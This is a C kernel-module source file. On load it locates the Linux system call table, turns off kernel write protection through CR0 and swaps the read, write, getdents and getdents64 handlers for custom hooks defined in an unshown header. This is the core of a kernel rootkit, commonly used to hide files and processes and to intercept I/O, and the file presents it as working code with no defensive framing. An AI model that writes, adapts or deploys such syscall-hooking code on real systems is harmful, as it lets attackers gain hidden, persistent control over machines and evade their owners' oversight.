#include "hooks.h"


static int __init onload(void) {
    printk(KERN_WARNING "Hello world!\n");
    char *kernel_version = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
    // printk(KERN_EMERG "Version: %s\n", acquire_kernel_version(kernel_version));
  
    find_sys_call_table(acquire_kernel_version(kernel_version));
  
    printk(KERN_EMERG "Syscall table address: %p\n", syscall_table);
    printk(KERN_EMERG "sizeof(unsigned long *): %zx\n", sizeof(unsigned long*));
    printk(KERN_EMERG "sizeof(sys_call_table) : %zx\n", sizeof(syscall_table));
  
    if (syscall_table != NULL) {
        write_cr0 (read_cr0 () & (~ 0x10000));
        original_write = (void *)syscall_table[__NR_write];
        syscall_table[__NR_write] = &new_write;
        original_read = (void *)syscall_table[__NR_read];
        syscall_table[__NR_read] = &new_read;
        original_getdents64 = (void *)syscall_table[__NR_getdents64];
        syscall_table[__NR_getdents64] = &new_getdents64;
        original_getdents = (void *)syscall_table[__NR_getdents];
        syscall_table[__NR_getdents] = &new_getdents;
        write_cr0 (read_cr0 () | 0x10000);

        printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
    } else {
        printk(KERN_EMERG "[-] onload: syscall_table is NULL\n");
    }
  
    kfree(kernel_version);
  
    /*
     * A non 0 return means init_module failed; module can't be loaded.
     */
    return 0;
}

static void __exit onunload(void) {
    if (syscall_table != NULL) {
        write_cr0 (read_cr0 () & (~ 0x10000));
        syscall_table[__NR_write] = original_write;
        syscall_table[__NR_read] = original_read;
        syscall_table[__NR_getdents64] = original_getdents64;
        syscall_table[__NR_getdents] = original_getdents;
        write_cr0 (read_cr0 () | 0x10000);
        printk(KERN_EMERG "[+] onunload: sys_call_table unhooked\n");
    } else {
        printk(KERN_EMERG "[-] onunload: syscall_table is NULL\n");
    }

    printk(KERN_INFO "Goodbye world!\n");
}

module_init(onload);
module_exit(onunload);
